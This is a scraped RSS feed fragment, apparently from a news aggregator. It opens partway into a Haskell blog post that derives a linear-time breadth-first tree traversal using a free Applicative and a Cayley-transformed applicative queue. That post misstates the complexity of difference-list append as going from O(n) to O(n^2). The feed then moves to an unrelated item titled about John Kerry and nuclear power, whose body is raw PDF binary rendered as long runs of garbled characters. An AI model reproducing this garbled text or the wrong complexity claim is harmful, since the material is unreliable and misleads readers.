<span id="cb1-6"><span>bftF ::</span> <span>Applicative</span> f <span>=&gt;</span> (a <span>-&gt;</span> f b) <span>-&gt;</span> [<span>Tree</span> a] <span>-&gt;</span> f [<span>Tree</span> b]</span>
<span id="cb1-7">bftF t <span>=</span> <span>fmap</span> <span>head</span> <span>.</span> <span>foldr</span> (<span>&lt;*&gt;</span>) (<span>pure</span> []) <span>.</span> <span>foldr</span> f [<span>pure</span> ([]<span>:</span>)]</span>
<span id="cb1-8">  <span>where</span></span>
<span id="cb1-9">    f (x <span>:&amp;</span> xs) (q <span>:</span> qs) <span>=</span> liftA2 c (t x) q <span>:</span> <span>foldr</span> f (p qs) xs</span>
<span id="cb1-10">    </span>
<span id="cb1-11">    p []     <span>=</span> [<span>pure</span> ([]<span>:</span>)]</span>
<span id="cb1-12">    p (x<span>:</span>xs) <span>=</span> <span>fmap</span> (([]<span>:</span>)<span>.</span>) x <span>:</span> xs</span>
<span id="cb1-13"></span>
<span id="cb1-14">    c x k (xs <span>:</span> ks) <span>=</span> ((x <span>:&amp;</span> xs) <span>:</span> y) <span>:</span> ys</span>
<span id="cb1-15">      <span>where</span> (y <span>:</span> ys) <span>=</span> k ks</span></code></pre></div>
<p>It has the correct semantics and asymptotics.</p>
<div id="cb2"><pre><code><span id="cb2-1">tree <span>=</span></span>
<span id="cb2-2">    <span>1</span> <span>:&amp;</span></span>
<span id="cb2-3">      [ <span>2</span> <span>:&amp;</span></span>
<span id="cb2-4">          [ <span>5</span> <span>:&amp;</span></span>
<span id="cb2-5">              [ <span>9</span>  <span>:&amp;</span> []</span>
<span id="cb2-6">              , <span>10</span> <span>:&amp;</span> []]</span>
<span id="cb2-7">          , <span>6</span> <span>:&amp;</span> []]</span>
<span id="cb2-8">      , <span>3</span> <span>:&amp;</span> []</span>
<span id="cb2-9">      , <span>4</span> <span>:&amp;</span></span>
<span id="cb2-10">          [ <span>7</span> <span>:&amp;</span></span>
<span id="cb2-11">              [ <span>11</span> <span>:&amp;</span> []</span>
<span id="cb2-12">              , <span>12</span> <span>:&amp;</span> []]</span>
<span id="cb2-13">          , <span>8</span> <span>:&amp;</span> []]]</span>
<span id="cb2-14">          </span>
<span id="cb2-15"><span>&gt;&gt;&gt;</span> bft <span>print</span> tree</span>
<span id="cb2-16"><span>1</span></span>
<span id="cb2-17"><span>2</span></span>
<span id="cb2-18"><span>3</span></span>
<span id="cb2-19"><span>4</span></span>
<span id="cb2-20"><span>5</span></span>
<span id="cb2-21"><span>6</span></span>
<span id="cb2-22"><span>7</span></span>
<span id="cb2-23"><span>8</span></span>
<span id="cb2-24"><span>9</span></span>
<span id="cb2-25"><span>10</span></span>
<span id="cb2-26"><span>11</span></span>
<span id="cb2-27"><span>12</span></span>
<span id="cb2-28">() <span>:&amp;</span></span>
<span id="cb2-29">   [ () <span>:&amp;</span></span>
<span id="cb2-30">        [ () <span>:&amp;</span></span>
<span id="cb2-31">             [ () <span>:&amp;</span> []</span>
<span id="cb2-32">             , () <span>:&amp;</span> []]</span>
<span id="cb2-33">        , () <span>:&amp;</span> []]</span>
<span id="cb2-34">   , () <span>:&amp;</span>   []</span>
<span id="cb2-35">   , () <span>:&amp;</span></span>
<span id="cb2-36">        [ () <span>:&amp;</span></span>
<span id="cb2-37">             [ () <span>:&amp;</span> []</span>
<span id="cb2-38">             , () <span>:&amp;</span> []]</span>
<span id="cb2-39">        , () <span>:&amp;</span> []]]</span></code></pre></div>
<p>But it’s quite difficult to understand, and doesn’t lend much insight into what’s going on with the whole “breadth-first” notion. The technique the function uses also isn’t reusable.</p>
<p>A much nicer function uses the <code>Phases</code> Applicative <span data-cites="easterly_functions_2019">(Easterly <a href="#ref-easterly_functions_2019" role="doc-biblioref">2019</a>)</span>:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>bft ::</span> <span>Applicative</span> f <span>=&gt;</span> (a <span>-&gt;</span> f b) <span>-&gt;</span> <span>Tree</span> a <span>-&gt;</span> f (<span>Tree</span> b)</span>
<span id="cb3-2">bft f <span>=</span> runPhases <span>.</span> go</span>
<span id="cb3-3">  <span>where</span></span>
<span id="cb3-4">    go (x <span>:&amp;</span> xs) <span>=</span> liftA2 (<span>:&amp;</span>) (<span>Lift</span> (f x)) (later (<span>traverse</span> go xs))</span></code></pre></div>
<p>But this function is quadratic.</p>
<p>So the task for this post today is to derive a type like the <code>Phases</code> type with a <code>later</code> operation, but which has the appropriate performance characteristics. At the end I’ll look into what the theoretical properties of this type are.</p>

<p>At its core, the <code>Phases</code> type is basically a free Applicative <span data-cites="capriotti_free_2014">(Capriotti and Kaposi <a href="#ref-capriotti_free_2014" role="doc-biblioref">2014</a>)</span>. I’ll reimplement it here as a slightly different free Applicative (one that’s based on <code>liftA2</code> rather than <code>&lt;*&gt;</code>):</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>data</span> <span>Free</span> f a <span>where</span></span>
<span id="cb4-2">  <span>Pure</span><span> ::</span> a <span>-&gt;</span> <span>Free</span> f a</span>
<span id="cb4-3">  <span>Lift</span><span> ::</span> (a <span>-&gt;</span> b <span>-&gt;</span> c) <span>-&gt;</span> f a <span>-&gt;</span> <span>Free</span> f b <span>-&gt;</span> <span>Free</span> f c</span>
<span id="cb4-4">  </span>
<span id="cb4-5"><span>lower ::</span> <span>Applicative</span> f <span>=&gt;</span> <span>Free</span> f a <span>-&gt;</span> f a</span>
<span id="cb4-6">lower (<span>Pure</span> x) <span>=</span> <span>pure</span> x</span>
<span id="cb4-7">lower (<span>Lift</span> f x xs) <span>=</span> liftA2 f x (lower xs)</span></code></pre></div>
<p>The key with the <code>Phases</code> type is to observe that there’s actually two possible implementations of <code>Applicative</code> for the <code>Free</code> type above: one which makes it the “correct” free applicative:</p>
<div id="cb5"><pre><code><span id="cb5-1"><span>instance</span> <span>Applicative</span> (<span>Free</span> f) <span>where</span></span>
<span id="cb5-2">  <span>pure</span> <span>=</span> <span>Pure</span></span>
<span id="cb5-3"></span>
<span id="cb5-4">  liftA2 c (<span>Pure</span> x) ys <span>=</span> <span>fmap</span> (c x) ys</span>
<span id="cb5-5">  liftA2 c (<span>Lift</span> f x xs) ys <span>=</span> <span>Lift</span> (\x (y,z) <span>-&gt;</span> c (f x y) z) x (liftA2 (,) xs ys)</span></code></pre></div>
<p>And then one which <em>zips</em> effects together:</p>
<div id="cb6"><pre><code><span id="cb6-1"><span>instance</span> <span>Applicative</span> f <span>=&gt;</span> <span>Applicative</span> (<span>Free</span> f) <span>where</span></span>
<span id="cb6-2">  <span>pure</span> <span>=</span> <span>Pure</span></span>
<span id="cb6-3">  </span>
<span id="cb6-4">  liftA2 c (<span>Pure</span> x) ys <span>=</span> <span>fmap</span> (c x) ys</span>
<span id="cb6-5">  liftA2 c xs (<span>Pure</span> y) <span>=</span> <span>fmap</span> (<span>flip</span> c y) xs</span>
<span id="cb6-6">  liftA2 c (<span>Lift</span> f x xs) (<span>Lift</span> g y ys) <span>=</span> </span>
<span id="cb6-7">    <span>Lift</span> </span>
<span id="cb6-8">      (\(x,y) (xs,ys) <span>-&gt;</span> c (f x xs) (g y ys)) </span>
<span id="cb6-9">      (liftA2 (,) x y) </span>
<span id="cb6-10">      (liftA2 (,) xs ys)</span></code></pre></div>
<p>This second instance makes the <code>Free</code> type into not a free Applicative at all: instead it’s some kind of Applicative transformer which we can use to reorder effects. Since effects are combined only when they’re at the same point in the list, we can use it to do our breadth-first traversal.</p>
<p>As an aside, from this perspective it’s clear that this is some kind of <code>FunList</code> <span data-cites="vanlaarhoven_nonregular_2009">(van Laarhoven <a href="#ref-vanlaarhoven_nonregular_2009" role="doc-biblioref">2009</a>)</span>: this opens up a lot of interesting curiosities about the type, since that type in particular is quite well-studied.</p>
<p>Anyway, we’re able to do the <code>later</code> operation quite simply:</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>later ::</span> <span>Free</span> f a <span>-&gt;</span> <span>Free</span> f a</span>
<span id="cb7-2">later <span>=</span> <span>Lift</span> (<span>const</span> <span>id</span>) (<span>pure</span> ())</span></code></pre></div>

<p>The problem at the moment is that the Applicative instance has an <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathvariant="script"><mi>𝒪</mi></mstyle><mo stretchy="false" form="prefix">(</mo><mi>n</mi><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{O}(n)</annotation></semantics></math> <code>liftA2</code> implementation: this translates into an <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathvariant="script"><mi>𝒪</mi></mstyle><mo stretchy="false" form="prefix">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{O}(n^2)</annotation></semantics></math> traversal overall.</p>
<p>If we were working in a more simple context of just enumerating the contents of the tree, we might at this point look to something like difference lists: these use the cayley transform on the list monoid to turn the append operation from <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathvariant="script"><mi>𝒪</mi></mstyle><mo stretchy="false" form="prefix">(</mo><mi>n</mi><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{O}(n)</annotation></semantics></math> to <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathvariant="script"><mi>𝒪</mi></mstyle><mo stretchy="false" form="prefix">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{O}(n^2)</annotation></semantics></math>. It turns out that there is a similar cayley transformation for Applicative functors <span data-cites="rivas_notions_2014 rivas_monoids_2015">(Rivas and Jaskelioff <a href="#ref-rivas_notions_2014" role="doc-biblioref">2014</a>; Rivas, Jaskelioff, and Schrijvers <a href="#ref-rivas_monoids_2015" role="doc-biblioref">2015</a>)</span>:</p>
<div id="cb8"><pre><code><span id="cb8-1"><span>newtype</span> <span>Day</span> f a <span>=</span> <span>Day</span> {<span> runDay ::</span> <span>∀</span> b<span>.</span> f b <span>-&gt;</span> f (a, b) }</span>
<span id="cb8-2"></span>
<span id="cb8-3"><span>instance</span> <span>Functor</span> f <span>=&gt;</span> <span>Functor</span> (<span>Day</span> f) <span>where</span></span>
<span id="cb8-4">  <span>fmap</span> f xs <span>=</span> <span>Day</span> (<span>fmap</span> (first f) <span>.</span> runDay xs)</span>
<span id="cb8-5">  </span>
<span id="cb8-6"><span>instance</span> <span>Functor</span> f <span>=&gt;</span> <span>Applicative</span> (<span>Day</span> f) <span>where</span></span>
<span id="cb8-7">  <span>pure</span> x <span>=</span> <span>Day</span> (<span>fmap</span> ((,) x))</span>
<span id="cb8-8">  liftA2 c xs ys <span>=</span></span>
<span id="cb8-9">    <span>Day</span> (<span>fmap</span> (\(x,(y,z)) <span>-&gt;</span> (c x y, z)) <span>.</span> runDay xs <span>.</span> runDay ys)</span></code></pre></div>
<p>And with this type we can implement our queue of applicative effects:</p>
<div id="cb9"><pre><code><span id="cb9-1"><span>type</span> <span>Queue</span> f <span>=</span> <span>Day</span> (<span>Free</span> f)</span>
<span id="cb9-2"></span>
<span id="cb9-3"><span>runQueue ::</span> <span>Applicative</span> f <span>=&gt;</span> <span>Queue</span> f a <span>-&gt;</span> f a</span>
<span id="cb9-4">runQueue <span>=</span> <span>fmap</span> <span>fst</span> <span>.</span> lower <span>.</span> <span>flip</span> runDay (<span>Pure</span> ())</span>
<span id="cb9-5"></span>
<span id="cb9-6"><span>now ::</span> <span>Applicative</span> f <span>=&gt;</span> f a <span>-&gt;</span> <span>Queue</span> f a</span>
<span id="cb9-7">now xs <span>=</span> <span>Day</span> \<span>case</span></span>
<span id="cb9-8">  <span>Pure</span> x      <span>-&gt;</span> <span>Lift</span> (,) xs (<span>Pure</span> x)</span>
<span id="cb9-9">  <span>Lift</span> f y ys <span>-&gt;</span> <span>Lift</span> (\(x,y) z <span>-&gt;</span> (x, f y z)) (liftA2 (,) xs y) ys</span>
<span id="cb9-10"></span>
<span id="cb9-11"><span>later ::</span> <span>Applicative</span> f <span>=&gt;</span> <span>Queue</span> f a <span>-&gt;</span> <span>Queue</span> f a</span>
<span id="cb9-12">later xs <span>=</span> <span>Day</span> \<span>case</span></span>
<span id="cb9-13">  <span>Pure</span> x      <span>-&gt;</span> <span>Lift</span> (<span>const</span> <span>id</span>) (<span>pure</span> ()) (runDay xs (<span>Pure</span> x))</span>
<span id="cb9-14">  <span>Lift</span> f y ys <span>-&gt;</span> <span>Lift</span> (\x (y,z) <span>-&gt;</span> (y, f x z)) y (runDay xs ys)</span></code></pre></div>
<p>As expected, this gives us the clean implementation of a breadth-first traversal with the right asymptotics (I think):</p>
<div id="cb10"><pre><code><span id="cb10-1"><span>bft ::</span> <span>Applicative</span> f <span>=&gt;</span> (a <span>-&gt;</span> f b) <span>-&gt;</span> <span>Tree</span> a <span>-&gt;</span> f (<span>Tree</span> b)</span>
<span id="cb10-2">bft f <span>=</span> runQueue <span>.</span> go</span>
<span id="cb10-3">  <span>where</span></span>
<span id="cb10-4">    go (x <span>:&amp;</span> xs) <span>=</span> liftA2 (<span>:&amp;</span>) (now (f x)) (later (<span>traverse</span> go xs))</span></code></pre></div>
<p>(it’s worth pointing out that we haven’t actually used the applicative instance on the free applicative at any point: we have inlined all of the “zipping” to make it absolutely clear that everything has stayed linear).</p>

<p>I have yet to really dive deep on any of the theory involved in this type, I just quickly wrote up this post when I realised I was able to use the cayley transform from the mentioned papers to implement the proper breadth-first traversal. It certainly seems worth looking at more!</p>



        </div></div>]]>
            </description>
            <link>https://doisinkidney.com/posts/2020-11-23-applicative-queue.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25190094</guid>
            <pubDate>Mon, 23 Nov 2020 18:45:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[John Kerry, Biden's special envoy on climate was a leading anti-nuclear force [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25190008">thread link</a>) | @rllearneratwork
<br/>
November 23, 2020 | http://www.thesciencecouncil.com/pdfs/PlentifulEnergy.pdf | <a href="https://web.archive.org/web/*/http://www.thesciencecouncil.com/pdfs/PlentifulEnergy.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>üDHYN2ä�°�´ä3ZH˜P¯HÔØo]Ž	oÍœ=;„–çYžk·úä”¯…v¯ŽH@VÍg)'u
KËÎ	kX�rd
ÈŠï·ËÏ½g‹¹‹2•$0¡AË
*éín¡ejêukÐäd,3�¢÷=ÏU„9ƒ7&amp;S¿òÌS"”q	¢ëòæÔL²B\Çêc­
ï“‹\´böWó&gt;†·–®±¥:máÛl•'&gt;.!³Å
êˆˆ£¦þ9”ëkzLN�u‹¶Î�hFÄ}8ƒ/ƒD=+Bò|aäy9*°¡ˆî÷9Dò¹¸´ìÊêæ-2(¢ˆôÔv²°-É”¸FÈµ+›¸ø¨&nbsp;8Di‰™,gP“ôyG˜•$ÕOŽN"Ú&amp;xy¦6—Ö×jž¬a†æ‡qQ€‚ÆB\Þæ»ˆ.]P.Þ‘ZS}Î]ˆS‰¨ òaÙsŒìUØ«±Wb®Å]Š»l
à%WäUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUpªìUØ«±Wb®Å]Š»v*ØèqV2
rÕov$+�¦E]„*á·\iW�ìBÛ
¶*ÞWaVë¾jW�ò*ìU°0ªà1A_L
í±Kª1VëíŠ®›®*Þø«·ÅZ©ñÅmÛøŸ»wßŠµþ}qWŠi¿£·÷b­WåŠ\UÕÅ]SŠ»|VÝ÷â¶ï¿·}ø­»ïÅmÕ¦*êâ®®*ßÝŠµôb–þœUªVÛßkèÅ]ôb—mŠ7u1KT8¡±p-¯ãLPÙZR„áŠµCãŠ»qÓvþª­¹ýâJ	¯€ÀSºc.¦·ÊHmÇáÛä2&lt;4Øei…¬_Y³ºôáVéñ*¢•ÜÑg`Ò…„²Æ
‡ø‡ÄÃéÛˆÉ�Üyq–sqWf$½NÂ•×¶@dm8væÇf¾¼�@YÉPÝWj‘ãã“á
&amp;D!/u½ôù¢+ §%Zî|p�H”ø�ˆ!�5&nbsp;÷®ô?)ù‚àI"M%"êXmCNÿ&lt;£$¼OVuaæÕŠS„²hr£�ÉŽ¢ŠeúnÒwhÊò
×gâƒ“Ëvw2úà=˜($wï’!‰Â	µ+�&amp;k‰•âmãj†'zwçˆ•"P$£ÓPhÃÃ"�AÜûŸá‚™‰ÖÈ[›9®Ê±�2�Ï°Â
112Zmæµ#‰&nbsp;n˜óZ!‚ùËQ%#·zò�§l»\]Lú0hu­øúmöNÕËLmÅ!4Ï;´’³“’˜“jXPìUØ«±Wb®Å]Š®Ç"J®À®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±WR¸ªð)Š·Š»v*ìUØ«±Wb®Å]Š¶:U‹LµUøªÒqV†xÀ‹vH!°iŠ¯ÈÚ»
®ëóÀ«†*ì*ìi@]Z|°ÒipÈ¡v(l}8m6ØÀ‚¿kZn¸ÒZ¯¾UÀŒi�%ÕÒ]\	j¸i
õí�-}¡½üqK¾œiZÛßwÑŠº¿,UÕÅ[©ÅZßvø«±Wb®ßWoŠº§uqWWåŠ»lUÛxâ­ïãŠ»VÝ_ž*êûâ®®*ÝqWSÛ·Ç-ÔÅm¼Uß~(u}ÿRêûâ­ïìqWT÷ÒmÕñ¤ÚàiÐ‘_¢¸)W™\ðøÏÁö}±M²»_5ÏÄ¥ÀFPû=r³ŒtoŽsÕ_ëú]ú˜�}3½(¼W—Cïƒ„„ñFLRí#†gº×jƒ,´Kb†4®Ý1b¹’&nbsp;1õ8²m}%´œ�Ä;ƒ€ÆÙ	S;Ñ¤iÙJš‡ZŠœª[98Í½#Oª
Å|+”ÉÌ…¦ñÄ–a¤w?ûöÈól…réxÞ’Ò½yR¸FÌdx¶J×N»·wd î7¯l<a‡ tÒÝ],¬¨ËÀ�ytb?®k`À’^gæx™&ç)ÝgÀãéÌŒeÁÌ7Ý‹å­Å]Š»v*ìuØ«±uàs"j·�]Š»v*ìuØ«±wb®Å]Š»v*ìuØ«±wb®Å]Š»v*ìuØ«±wb®Å]Š»v*ìuØ«±wb­�\u})Š»v*ìuØ«±wb®Å]Š»v*Øèqv-–«\±uÀb®Å¸…ø«°Ú®˜)wwzv*ß]ñk�®+mâ«…*Ø4í�!u|+n&˜­º¾øv×w97Šm½¼1¥ke7zxci^4Å²k‹&±e:žØ¦�l­â–±wb‹oµŠÅ-ac±¥owÑŠµŠ»w`vð««�]Š»lußn)v*ìuÕÅ[¯Ëu}±w}¡¾˜«`â®®n¸rî]6À®¨ðÂ­ôí�4ŸÁå�béu¢�ø±j‰ßa�3¸`‘ä·ü="|C•‹™CBâ?…vÇŒ#Á(7Ò¯PU­&amp;´¯ý0ñ'îD.“¨K" e¼¦?;ü°qør!eÖ…{c="" \k="" tn›Ôý#¶0vx¥em¬Ç“Ô�p–1Ý0¾Ó¡‚$xå-zÔÒ«ýr1“9@�€m,="">&nbsp;Œ²)âXŸ:a,h‘hR
á¶.®Vúâ�SXgºÓÕ‰	ËcØüŽB�l³Ú/3\¢¡f?k±¥0a˜ÎCØm/â½´�äañ b	Þ‡1H¢ìc! ™[›rJDÃ•:dK8×ER“
l:õ']Ð÷RzjDŒ'D‹Ä|á kÒ§—%úq;æ^.N³PwbYkŽìUØ«±Wb®Å[¸-W…ðÈ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØªà1UØ«±Wb®Å]Š»v*ìUØ«±Wb®Å[*Ä¹W-Wb«�ÅŠìUØªàpR·Š·…W�+«Š·R1Vúï\QkÆØk«ŠµSãŠWãŠ)v6®Åm±…mv
E·ŠmØ­µÓ¾(µÀûáO5Ã!¼SNÀ—b—uÃHuq¥·cKnÆ–ÝŠÂ­×v(k®*ê{œUßN)vþ8¡¼RÕ}±Vê0RÛ±¤Û±Wb®Å[Å]¾wÑŠÛ¾ŒVÛÛ¶ëŠÛ�oj˜­7Š¸mŠipr:©ö‘¡=RÒB¡ˆµ*}»ä%][q‰L’7_Ð‘ÞÜ+Æä–0·"	Ç]¾YY”eÍ¼C&amp;&gt;J¾Uó&amp;£-ÃC&lt;†tU,ÂAV^Û¸ä€èœäMÞ§Ãp©'¦Ë]ÅiOžùŽ\ðA]sci¨BÐJŠÈÛ�E1²ÄHQJž+;HVÉ&gt;1Àµ${œ–å�;RC«yJÎxä{6=jÁëAò§L”r‘Í§&amp;y1½;O½±w¶1,±Újÿ3–Hƒ»L!(ì’ëZcZ^ëÄ0jÐûŒœ%myaL\¡^»m\±&nbsp;®…KÈŠ©Ì±/‰=±)¯VÓ¤Óm£våNê¥^ª	ß§ZøåQ•�œœ�á±¨¢ÉKÕ˜ß®Ytã�{=Yt	­=0²¨&nbsp;W‘ßïþŒgn„Bo§C»3MÉ�Ø
©L‰l€GÝùŽZG!åã¾ã…³–`6C
VßQNU­
=ððÓ1&amp;æ­#mF	~*�"·sØ�é–ãŸG&gt;0GyÞd8nÅ]Š»\Š–Ðu8-4¾(šSEÄ•Ñ)e4…BFÍ]¶•ÈZDIFÁ¥;0*§zP“ø`2d1¬“Kq4±«rµ�kÐ|ñâGék+!£�É1[ŠŠ»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUxÅ[Å]Š»v*ìUØ«±Wb®Å]Š»v*ìU±Ðâ¬@e©\q`ìUx5Å[Å]Š®
‚•ß†laUààC{ckk«L¶ëL+mà¤:¸U¼R¸ØÒ¯¾*ê�UÀâ›\(]_li]_lUÕöÅ[Òðq[okok¦4†ª1Mº¸¡Ûâ­b­â­mŠ»lUÛb®Å]Š·¾*êâ­õÅ6ìUÕ8­:¸«x
mØÒÛ±VÀÀ‹]LU¯óëŠ»sÜb¥ßF*î½Ž*ØÅ!u1K†Ä+íã�Y&gt;•gi«¹FOM€ø¨W"bßŽ"läêQhÑ ø™�6Ê¸x·._&nbsp;¯oæ±"�Ö&nbsp;î
âI=pi�$ÚÞ].êO\ÛzrRÊhÇçN¹a°“t…Õµ·à°’tðÃÛ“®HEÔn	+AÓ¾<e–Øê)z¡ cu¬Šr#="">%ì³G!•HéBûTÅH6‹Ajªçs��¤‹XÑÒö7d‘A¡â}òq•5dÇÄ+I++ª‡CÄ�kZf\C«Ÿ4N�f×WšñPã“@=ðLÐN8Ùz-ÚAþƒxIïâ&gt;@Ûpç–ÅUNÒáX.¡‡	À£õ¨ÜxwñÁ¼¹-F�Í”4Ë¨&nbsp;ôœz}�ˆÈro¾.Lzî5ÓËI»©ÜW®HnÓ!Âó½GRúÌü�‡§ß—Æ49ÎÊ…†©-¼‡‰Øœ2�¢!“Ïpu4H›ábA»r÷ÊÀ¦òx¶N%ò¢Ïõ5”)ÂÐ{íÜdFFÃ§°óû½4é×
k,lå�ÂËÝ|E?¼J÷q%EÖrzo F¤dsÿ&amp;½ÈáâaÂSÿ-h±ê2º"âHíSóÈd�rnÃ‹‹›3ŸÉ‘NPÃEJ

Àñ¦R2Ó�t×É}—•9$3Ä¾Ÿ‚Ôbrw,pW4ÌýVÇŠ'ÙZÒ½A9Ë=¢å™J1×¹â7Å ¤rÜÁk*½Äh)^ÕÉ|šŒ€;¥÷�i~ÃàVð;d…†"LNúÖ(‹q¨¡5éí–Ñ(€”dš�Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š¶qUàSv*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å[*ÃÎZÄ–Á®)]ŠŠ¯v*ï–\n¸¢Ûs^7_|*à}±VëŠ®¯¾*Õp«uÅm°k�[ÅÝq[n¸iy®À¶ìVÛ±KuÅBêûâ¥¼U¼U¬UØ««ŠµË
µ\UÛâ®ßW}8«©ïŠº‡ÇWoŠº¸ªêàWb®Å[®*ØÅ]ŠmØ­º˜«€À®À†ñWWn¸¥ÕÅ[ëŠº¸­·Šmºâ©Å•òXE'ï\P´Èm°—C-Û9i%vfo~¸i�RºÚþHÛw ×­11LgLšÇSæûµ[ç×+1nŒÙ-¼ÁÃ,‹Us•�ßŒhL

�»llê”d¹–À• Ð¯|5ÞÄ’9"l|Â×RzN­
ˆqO§å‰…2†kÙ1�èŽ2(p+×¨È
™ÈZE},º[ªÎßT–¨¨ê¿†XT‰�7›\F—SH-•�ÙÉFÔ9x47pÈ³³-òŽ�ûÇrò±×ÔŒÔ~ó¶þVIÖÎFŸ–ïSº{+&gt;!ã�àPÕëNÝzæ8²ç"&nbsp;'Ó5�°LQë¿{ŒwŠÜg±E
"�X§Aƒ‹½&gt;žsæ{Hì”&nbsp;rÌzï^¹~3nxð¼Ü‚�P2÷	Oâ��î
p«:Òîmõ"Š[„&nbsp;
½ÆQ C•		½$HÆ4GnÃ)§6Ô^K{F…f+öˆ©N&lt;ÐH[‹K9íîJ¯8
Ä}Õú0‚CD|Õ´ÍêEª²ñý¥Ø\�¬1ð„ÚI,AÛ"ÌšA]j*Upi„2›Ïu§2’Ç/ˆq$wVÓµ|nGÏ¦	E”'L‘DZ¼%Uî§üö9_&amp;í¦v^Zµ†F•j@èˆùäŽBXÇ±íkI�ÆTP¿.tblœdÓ—h�IR¤2õk‹JX¡Ø«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ØªüUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ØèqV–±o\*»j¸ªþ¸UÕÀ‡á…U¦.®n¸«uÀ‹vlØªá¶Ø«xì)·W
WÔ`¤:¸««Š®_Ë†«í�]\*ØlUuq¤7SáŠ]¾*ê{â®¦(¶ñ[j¸­º¸«UÆ•ºûãKM�-7\i]\mm¼VÚ§†)uqUÕÅ\p%Ø¡ºœUÜ±WrÁJÝ}±WTøb‹vþ¦Ý¿†*êûb«�]·ŽÛ±¥¶€¦)v+KÑøÐž,ûð¡±¾)´ÃLt[”.h£©ùdeÉž3»8·×ôûC@Îæ½ú|¤À—(eˆL-üÃo|áOæî0tÌfP—Ì6ñ&nbsp;Z©¦Ûáà(9€bóë¿é
è%
A=k–4K.ìëJK{øã¹–èòPQM²©ØÙËÇRÜ”×V³µžÝ�ÍP¹&lt;‘SË1¤Ý¢ÈH„µy~Ð1Ó2.Ã‚z+j0XÁ[Ç­ö� *OË¾P#|ÜÎ1³×íní�\3±Sµ+^#,�
9A±u	b�H¬AµËm¤L†_gæ»¢¥ur£Œ7Ç9S–)575¯‰Â
 Ž%í&nbsp;ÅÚmúÓø@$Ú�ªFÜTvë“‰kœT,¬_yÐ®â�p’ˆA•Újò˜JÈ5Ûnß&lt;¨Å¾9
'öÖë|ŠY¸°=òÓhIÄ:hC8ý²Ø �B`ŽŠõ§|¹0�OT�ÝÓ²�ÈËcs,mï$%˜¾YÂÒd•Ks']é’�“PjB#ñ¥q1@�"¢ÖÍ›ó€•&gt;íƒ‚ù²xy#fó�Äª€ù	‘Ô’€—Ì2NjÀÔt5É09‰S–æ€ÒÆCßÇS wH˜Ô““j[ŠŠ»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØªà1UØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«c¡ÅXXËX¯Å]Š¶]�Z­1Bþ¸VéØ±n¸ªìPìB·Ë
%up1w\RØðÂ«¾x«†[}0­¶+k¾ünúqVë…6¸T¯®·W·WuqH+‡Ó…fë�]ZcKNÆ•¯§
-ªâ¶êâ®©Æ�êœi.©Æ�Ø8¦ÛÅ6ì­ãkm\RáŠ·Š®À›u1A]‹v)§A¡ÅiØ¥Ø¢Ñ¶ZmÎ¢H·‰ž�Hè&gt;œŒ¥Lá&gt;J—Må¢––UM6‰‚“ŒŽjÚKi)‰½6
M¼1‘ºod˜·¸À­ò¯\U½°%Ýq¥·cI¶ˆ¯¾*Ø4Åigc5ëp‰kü1$Â&amp;\“h´‹ˆ™ƒ%Jì|2A´c)c7ï‚KB&nbsp;îI…ïº�Å=Fâß¶(“I+ÆC#N”8&nbsp;d^³4S#HK€5ßo–BPo†R4‡E±ó‹‹d0šš¯fñëÓ*21æåqÉ¸ÙYü­cfñ‰•›€,
¹¥Fý0x„¯��Ø®½­Í?(¿a†Ã½Y4eÊNÌ7-hW†^öËR°ß¦W(·C%+Üë/#–KIç¿izœ�‹\§nµ¼š?µ‰ŠÆD"ÿLÊÔBÈð²ñJ%|Çq�ï¾Ÿ„tþj–HÕC{ö0Èç4¶ÛÌÓ7ÀÌTxŒN5ŽbŠŠõ%�ÆònÞý}°S!+]u%¼D|¼zâ*	$—ð\ª…WÀÓõä€¦£0PwÑ¢)ÐŒ�c0•ákv*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»u+Š¯˜«x«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±VÇCŠ°¬µŠêâ­Ö½1W{áUÀ×b‹]Ó7Š\*Ø8ªìVÝ\B-°qUÕ8¡Ûâ««ï¾)n£
